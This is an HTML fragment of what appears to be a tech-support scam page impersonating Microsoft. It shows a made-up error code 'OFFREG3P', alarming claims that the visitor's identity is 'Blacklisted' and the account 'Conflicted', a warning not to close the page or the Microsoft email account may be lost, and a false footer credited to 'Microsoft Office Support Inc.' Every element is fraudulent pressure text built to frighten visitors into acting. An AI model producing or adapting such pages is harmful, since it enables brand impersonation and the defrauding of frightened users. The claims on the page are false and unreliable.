...
<div class="loader1">
    ...
    <div class="container">
        <h1 class="in-head text-center">Error <span>"OFFREG3P"</span> Unable to register your account</h1>
        <p class="text-center nd-para-2">Account Conflicted | Duplicate Records | Identity Blacklisted</p>
        <p class="text-center nd-para-3">Do not refresh or close the page you might loose your Microsoft Email Account</p>
        ...
        <div class="col-lg-8 col-md-10 col-sm-12  col-lg-offset-2 col-md-offset-2 caht-b-gr text-center">
            ...
            <div class="copyright-foo">
                <ul>
                    ...
                    <li>Copyright © 2019 Microsoft Office Support Inc. All rights reserved.</li>
                </ul>
            </div>
        </div>
    </div>
